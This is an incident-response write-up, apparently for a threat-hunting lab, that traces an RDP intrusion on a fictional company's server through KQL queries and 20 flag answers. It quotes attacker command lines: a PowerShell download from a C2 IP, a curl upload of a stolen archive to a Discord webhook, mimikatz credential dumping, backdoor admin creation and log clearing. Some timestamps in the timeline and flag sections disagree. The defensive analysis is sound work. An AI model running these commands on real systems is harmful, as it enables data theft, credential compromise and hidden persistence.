
# Azuki Import/Export – “Port of Entry” Threat Hunt Report

**Analyst:** David Brown  
**Date Completed:** 2025-11-23  
**Environment Investigated:** `AZUKI-SL` (cloud-hosted Windows server)  
**Timeframe:** 2025-11-19 – 2025-11-20  

---

## Scenario

Azuki Import/Export Trading Co. (梓貿易株式会社) is a small logistics company whose 6-year shipping contract was suddenly undercut by a competitor by **exactly 3%**. Soon after, Azuki’s supplier contracts and pricing data surfaced on underground forums, strongly suggesting data theft rather than coincidence.  

Microsoft Defender for Endpoint telemetry from the IT admin workstation `AZUKI-SL` shows a full intrusion chain: a successful **RDP session from an external IP**, quick on-host discovery, Defender tampering via **path and extension exclusions**, downloading of tooling from an external C2, credential theft, data staging, exfiltration via **Discord webhooks**, and clean-up through **log clearing** and creation of a backdoor admin account.  

This report documents the hunt, KQL used, and flag-level findings for all 20 challenge questions.

---

## Executive Summary



---

## Timeline of Adversary Activity (`AZUKI-SL`)

> **Note:** The challenge does not require timestamps for flags, but key times from MDE screenshots are included here to enrich the narrative.

| **Time (UTC)**               | **Flag(s)** | **Action Observed**                                   | **Key Evidence**                                                                 |
| ---------------------------- | ----------- | ----------------------------------------------------- | --------------------------------------------------------------------------------- |
| ~2025-11-19 00:xx           | 1–2         | External RDP login from attacker IP                   | Successful RDP session from **88.97.178.12** to **`kenji.sato`**                 |
| 2025-11-19 01:04:05.734     | 3           | Network recon with ARP                                | `"ARP.EXE" -a` executed on multiple Azuki hosts (e.g., `azuki-logistics`)        |
| ~2025-11-19 morning         | 4           | Malware staging directory created                     | Creation/use of **`C:\ProgramData\WindowsCache`**                              |
| 2025-11-19 06:49:27–06:49:29| 5–6         | Defender exclusions added                             | Registry modifications under `…\Windows Defender\Exclusions\Extensions` & `Paths`|
| 2025-11-19 06:49:48.707     | 18          | Malicious script dropped                              | `wupdate.ps1` created via **PowerShell -ExecutionPolicy Bypass**                 |
| ~2025-11-19 xx:xx           | 7,10,11     | Tool download and C2 contact                          | `certutil.exe` contacting **78.141.196.6:443**                                   |
| ~2025-11-19 xx:xx           | 12–13       | Credential dumping via mm.exe & mimikatz module       | `mm.exe` with `sekurlsa::logonpasswords` arguments                               |
| 2025-11-19 07:08:58.024     | 14          | Archive created for exfiltration                      | `export-data.zip` created in `C:\ProgramData\WindowsCache`                     |
| 2025-11-19 07:09:21.423     | 15          | Exfiltration to Discord webhook                       | `curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord…` |
| 2025-11-19 07:09:48.897–53  | 17          | Backdoor account created & privileged                 | `net.exe` / `net1.exe` creating **support** and adding to `Administrators`       |
| 2025-11-19 07:11:39–46      | 16          | Event logs cleared                                    | Multiple `wevtutil.exe cl <LogName>` runs; **Security** cleared first           |
| ~2025-11-19 later           | 19–20       | Lateral movement attempt to 10.1.0.188                | `cmdkey` & `mstsc.exe` used with target IP **10.1.0.188**                        |

You can augment this table with additional timestamps from your screenshots as needed.

---

## Starting Point – Identifying the Initial System

**Why start with `AZUKI-SL`?**

- The incident brief explicitly identifies `AZUKI-SL` as the **IT admin workstation** and primary compromised asset.  
- Challenge guidance and all 20 flags point to MDE data where `DeviceName == "azuki-sl"` or accounts belonging to **`kenji.sato`**.  
- Defender exclusions, staging directory activity, script downloads, credential dumping, archive creation, and exfil all occur on this host.

**Baseline hunt anchor (example KQL):**

```kusto
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
```

From this starting point, the hunt branched out into **DeviceLogonEvents**, **DeviceRegistryEvents**, **DeviceFileEvents**, and **DeviceNetworkEvents**, using the queries listed below for each flag.

---

## Flag-by-Flag Findings

Below, each flag is documented with:

- **Objective & Answer**
- **Key Evidence**
- **KQL Used**
- **Screenshot placeholder** (where you have images to drop into your repo)

---

### 🚩 Flag 1 – Initial Access: Remote Access Source

**Objective:** Identify the source IP address of the RDP connection used for initial access.  

**Finding (answer):** `88.97.178.12`

**Key Evidence:**

- **Table:** `DeviceLogonEvents`  
- Successful logon event to `azuki-sl` from an **external IP** with logon type consistent with RDP.  
- `RemoteIP` field shows **88.97.178.12** for the suspicious successful interactive session.

**KQL Used:**

```kusto
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType contains "success"
| where RemoteIP != ""
| project TimeGenerated, AccountName, RemoteIP
```

---

### 🚩 Flag 2 – Initial Access: Compromised User Account

**Objective:** Identify which account was used during the malicious RDP session.  

**Finding (answer):** `kenji.sato`

**Key Evidence:**

- Same `DeviceLogonEvents` entry used in Flag 1.
- `AccountName` for the session from **88.97.178.12** is **`kenji.sato`**.

*(Same KQL as Flag 1 – simply focus on `AccountName` for the RDP session.)*

---

### 🚩 Flag 3 – Discovery: Network Reconnaissance

**Objective:** Identify the command and argument used to enumerate network neighbors.  

**Finding (answer):** `"ARP.EXE" -a`

**Key Evidence:**

- **Table:** `DeviceProcessEvents`  
- Multiple executions of **ARP.EXE** across Azuki devices with argument `-a`, listing ARP cache entries / network neighbors.  
- Example from your screenshot around **01:04:05.734** on `azuki-logistics`.

**KQL Used:**

```kusto
DeviceProcessEvents
| where AccountName == "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has "arp"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

**Screenshot placeholder:**

```markdown
![Flag 3 – ARP.EXE Network Recon](./flag-3.png)
```

---

### 🚩 Flag 4 – Defence Evasion: Malware Staging Directory

**Objective:** Identify the primary staging directory where malware was stored.  

**Finding (answer):** `C:\ProgramData\WindowsCache`

**Key Evidence:**

- **Table:** `DeviceProcessEvents` & `DeviceFileEvents`  
- Creation and usage of **`C:\ProgramData\WindowsCache`** followed by tool downloads and archive creation (e.g., `export-data.zip`, `svchost.exe`, `mm.exe`).  

**KQL Used:**

```kusto
DeviceProcessEvents
| where AccountName endswith "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("mkdir", "New-Item", "attrib")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

---

### 🚩 Flag 5 – Defence Evasion: File Extension Exclusions

**Objective:** Determine how many file extensions were excluded from Defender scanning.  

**Finding (answer):** `3`

**Key Evidence:**

- **Table:** `DeviceRegistryEvents`  
- Registry modifications under:  
  `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions`  
- Entries for `.exe`, `.ps1`, `.bat` set with value `0` during the attack window.

**KQL Used:**

```kusto
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryKey endswith @"Windows Defender\Exclusions\Extensions"
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
```

**Screenshot placeholder:**

```markdown
![Flag 5 – Defender Extension Exclusions](./flag-5.png)
```

---

### 🚩 Flag 6 – Defence Evasion: Temporary Folder Exclusion

**Objective:** Identify the temp folder path excluded from Defender scanning.  

**Finding (answer):** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

**Key Evidence:**

- `DeviceRegistryEvents` for `…\Windows Defender\Exclusions\Paths`  
- `RegistryValueName` set to `C:\Users\KENJI~1.SAT\AppData\Local\Temp` during the same time as script/tool creation.

**KQL Used:**

```kusto
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryKey endswith @"Windows Defender\Exclusions\Paths"
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
```

---

### 🚩 Flag 7 – Defence Evasion: Download Utility Abuse

**Objective:** Identify the Windows-native binary abused to download files.  

**Finding (answer):** `certutil.exe`

**Key Evidence:**

- **Table:** `DeviceProcessEvents`  
- Process command line includes URL + output file path, with `FileName == "certutil.exe"` executed under `kenji.sato`.

**KQL Used:**

```kusto
DeviceProcessEvents
| where AccountName == "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "C:"
    and ProcessCommandLine contains "http"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 8 – Persistence: Scheduled Task Name

**Objective:** Identify the scheduled task name used for persistence.  

**Finding (answer):** `Windows Update Check`

**Key Evidence:**

- **Table:** `DeviceProcessEvents`  
- `schtasks` invocation with `/create` and `/TN "Windows Update Check"` and `/TR` pointing to a PowerShell command.  

**KQL Used:**

```kusto
DeviceProcessEvents
| where AccountName == "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "schtasks"
    and ProcessCommandLine contains "create"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 9 – Persistence: Scheduled Task Target

**Objective:** Identify the executable path configured in the scheduled task.  

**Finding (answer):** `C:\ProgramData\WindowsCache\svchost.exe`

**Key Evidence:**

- Same `schtasks` command line as Flag 8, but focusing on the `/TR` argument specifying the executable path.

*(KQL same as Flag 8 – parse `/TR` out of `ProcessCommandLine`.)*

---

### 🚩 Flag 10 – Command & Control: C2 Server Address

**Objective:** Identify the C2 server IP.  

**Finding (answer):** `78.141.196.6`

**Key Evidence:**

- **Table:** `DeviceNetworkEvents`  
- Outbound connections from malware in `C:\ProgramData\WindowsCache` to **78.141.196.6** shortly after download.

**KQL Used:**

```kusto
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessCommandLine contains "certutil.exe"
| project TimeGenerated, RemoteIP, InitiatingProcessCommandLine, RemoteUrl
| order by TimeGenerated asc 
```

---

### 🚩 Flag 11 – Command & Control: C2 Communication Port

**Objective:** Identify the destination port used for C2 comms.  

**Finding (answer):** `443`

**Key Evidence:**

- Same `DeviceNetworkEvents` entries as Flag 10, focusing on `RemotePort == 443`.

**KQL Used:**

```kusto
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RemoteIP contains "78.141.196.6"
| project TimeGenerated, RemoteIP, RemotePort, LocalPort, RemoteUrl
| order by TimeGenerated asc 
```

---

### 🚩 Flag 12 – Credential Access: Credential Theft Tool

**Objective:** Identify the credential dumping executable.  

**Finding (answer):** `mm.exe`

**Key Evidence:**

- **Table:** `DeviceFileEvents`  
- Short-named binary `mm.exe` created in `C:\ProgramData\WindowsCache` preceding LSASS-related activity.

**KQL Used:**

```kusto
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains "windowscache"
| project TimeGenerated, ActionType, FileName, InitiatingProcessCommandLine
```

---

### 🚩 Flag 13 – Credential Access: Memory Extraction Module

**Objective:** Identify the mimikatz module used to dump logon passwords.  

**Finding (answer):** `sekurlsa::logonpasswords`

**Key Evidence:**

- `DeviceProcessEvents` shows **`mm.exe`** or another process spawning a command line with `sekurlsa::logonpasswords` as an argument or script content.

**KQL Used:**

```kusto
DeviceProcessEvents
| where AccountName == "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "::"
| project TimeGenerated, ActionType, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

---

### 🚩 Flag 14 – Collection: Data Staging Archive

**Objective:** Identify the compressed archive filename used for exfiltration.  

**Finding (answer):** `export-data.zip`

**Key Evidence:**

- **Table:** `DeviceFileEvents`  
- `FileCreated` entry for **`export-data.zip`** in `C:\ProgramData\WindowsCache` at **2025-11-19 19:08:58Z**, with initiating process being the malicious PowerShell script.

**KQL Used:**

```kusto
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains "windowscache"
| project TimeGenerated, ActionType, FileName, InitiatingProcessCommandLine, SHA256
```

**Screenshot placeholder:**

```markdown
![Flag 14 – export-data.zip Created](./flag-14.png)
```

---

### 🚩 Flag 15 – Exfiltration: Exfiltration Channel

**Objective:** Identify the cloud service used to exfiltrate the archive.  

**Finding (answer):** `discord`

**Key Evidence:**

- **Table:** `DeviceNetworkEvents`  
- `curl.exe` with command line:  
  `"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/…`  
- `RemoteUrl` shows `discord.com`.

**KQL Used:**

```kusto
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RemoteUrl != ""
| where InitiatingProcessCommandLine contains "export-data.zip"
| project TimeGenerated, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
```

**Screenshot placeholder:**

```markdown
![Flag 15 – curl Upload to Discord](./flag-15.png)
```

---

### 🚩 Flag 16 – Anti-Forensics: Log Tampering

**Objective:** Determine which Windows event log was cleared first.  

**Finding (answer):** `Security`

**Key Evidence:**

- **Table:** `DeviceProcessEvents`  
- Sequence of `wevtutil.exe cl Security`, then `System`, then `Application`.  
- First occurrence (e.g., **2025-11-19 17:21:25Z**) corresponds to **Security log**.

**KQL Used:**

```kusto
DeviceProcessEvents
| where AccountName == "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "wevtutil.exe"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Screenshot placeholder:**

```markdown
![Flag 16 – wevtutil Log Clearing](./flag-16.png)
```

---

### 🚩 Flag 17 – Impact: Persistence Account

**Objective:** Identify the backdoor local account created by the attacker.  

**Finding (answer):** `support`

**Key Evidence:**

- **Table:** `DeviceProcessEvents`  
- Commands:  
  - `"net.exe" user support ******** /add`  
  - `"net.exe" localgroup Administrators support /add`  
- Executed from PowerShell with ExecutionPolicy Bypass.

**KQL Used:**

```kusto
DeviceProcessEvents
| where AccountName == "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "/add"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Screenshot placeholder:**

```markdown
![Flag 17 – Backdoor support Account](./flag-17.png)
```

---

### 🚩 Flag 18 – Execution: Malicious Script

**Objective:** Identify the PowerShell script used to automate the attack chain.  

**Finding (answer):** `wupdate.ps1`

**Key Evidence:**

- **Table:** `DeviceFileEvents`  
- `FileCreated` event for **`wupdate.ps1`** in temp path referenced by Defender exclusions.  
- Initiated via:  
  `powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1'"`

**KQL Used:**

```kusto
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessCommandLine has_any (".ps1", "bat")
| project TimeGenerated, ActionType, FileName, InitiatingProcessCommandLine, SHA256
| order by TimeGenerated asc
```

**Screenshot placeholder:**

```markdown
![Flag 18 – wupdate.ps1 Created](./flag-18.png)
```

---

### 🚩 Flags 19 & 20 – Lateral Movement

**Objectives:**

- **Flag 19:** Identify the IP address targeted for lateral movement.  
- **Flag 20:** Identify the remote access tool used.  

**Findings (answers):**

- **Flag 19:** `10.1.0.188`  
- **Flag 20:** `mstsc.exe`

**Key Evidence:**

- **Table:** `DeviceNetworkEvents`  
- `cmdkey` used to store credentials and `mstsc.exe` initiated with target `10.1.0.188`.

**KQL Used:**

```kusto
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessCommandLine contains "cmdkey"
   or InitiatingProcessCommandLine contains "mstsc"
| project TimeGenerated, RemoteIP, InitiatingProcessCommandLine
```

---

## MITRE ATT&CK Mapping (High-Level)

- **Initial Access**
  - `T1133` – External Remote Services (RDP) *(Flags 1–2)*  
  - `T1078` – Valid Accounts *(Flag 2)*  

- **Execution**
  - `T1059.001` – PowerShell *(wupdate.ps1, download & orchestration)*  
  - `T1059.003` – Windows Command Shell *(net, certutil, wevtutil, schtasks)*  

- **Persistence**
  - `T1053.005` – Scheduled Task: Scheduled Task *(Windows Update Check)*  
  - `T1136.001` – Account Creation: Local Account *(support)*  

- **Privilege Escalation & Discovery**
  - `T1018` – Remote System Discovery *(ARP, later mstsc targets)*  
  - `T1016` – System Network Configuration Discovery *(ARP -a)*  

- **Defense Evasion**
  - `T1562.001` – Impair Defenses: Disable or Modify Tools *(Defender exclusions)*  
  - `T1070.001` – Clear Windows Event Logs *(wevtutil.exe cl)*  

- **Credential Access**
  - `T1003.001` – OS Credential Dumping: LSASS Memory *(mm.exe + sekurlsa::logonpasswords)*  

- **Collection & Exfiltration**
  - `T1560.001` – Archive Collected Data *(export-data.zip)*  
  - `T1567.002` – Exfiltration to Cloud Storage / Web Service *(Discord webhook via curl)*  

- **Lateral Movement**
  - `T1021.001` – Remote Services: RDP *(mstsc.exe to 10.1.0.188)*  

---

## Recommended Actions

1. **Immediate Containment**
   - Isolate `AZUKI-SL` and any hosts that communicated with **78.141.196.6** or the Discord webhook.
   - Disable or remove the `support` account and any additional local admin accounts created during the intrusion.

2. **Eradication & Recovery**
   - Remove `C:\ProgramData\WindowsCache` contents and any artifacts in the excluded temp directory.  
   - Delete scheduled tasks named **Windows Update Check** or similarly suspicious maintenance-style names.
   - Re-enable Defender default scanning settings; remove all custom exclusions and enforce **Tamper Protection**.

3. **Credential Hygiene**
   - Reset passwords for `kenji.sato` and any accounts whose credentials could have been exposed via `mm.exe` / mimikatz.
   - Review sign-in logs for abnormal access patterns from 88.97.178.12 and 10.1.0.188.

4. **Detection Engineering**
   - Create or tune detections for:
     - PowerShell with `-ExecutionPolicy Bypass` or downloads to ProgramData / temp paths.
     - `certutil.exe` or `curl.exe` with external URLs and `-F file=@`.
     - Event log clearing via `wevtutil.exe cl`.
     - New local admin accounts (`net user` + `localgroup Administrators /add`).

5. **Network Controls**
   - Block or closely monitor outbound traffic to:
     - Known malicious IPs such as **78.141.196.6**.
     - `discord.com/api/webhooks` from server networks.

6. **Lessons Learned**
   - Implement just-enough-administration and restrict RDP access to specific jump hosts with MFA.  
   - Periodically audit Defender configuration for unauthorized exclusions.  
   - Train staff to recognize and report unexpected remote sessions and post-incident anomalies.

---
